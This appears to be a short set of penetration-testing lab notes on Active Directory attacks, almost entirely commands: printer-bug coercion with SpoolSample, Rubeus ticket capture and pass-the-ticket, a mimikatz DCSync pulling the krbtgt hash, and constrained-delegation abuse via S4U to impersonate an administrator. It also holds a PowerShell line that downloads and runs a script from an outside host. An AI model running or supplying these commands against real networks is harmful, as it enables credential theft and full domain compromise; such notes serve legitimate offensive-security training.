```
# in ps to test if spool service is running:
dir \\cdc01\pipe\spoolss
SpoolSample.exe CDC01 APPSRV01
Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
Rubeus.exe ptt /ticket:doIFIjC...

# in mimikatz:
# /user: is the user of whom we want the hash from
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

# constrained kerberos delegation

```
IEX (new-object net.webclient).downloadstring('http://192.168.49.71/PowerView.ps1')
Get-DomainUser -trustedtoauth

## Lab is here the password of the user with which we are logged in
.\Rubeus.exe hash /password:lab
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

## after we have gotten the ticket we can impersonate a user for a specific service
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt

## The ticket is then automatically used form memory to perform authenticatio for that specific service
```
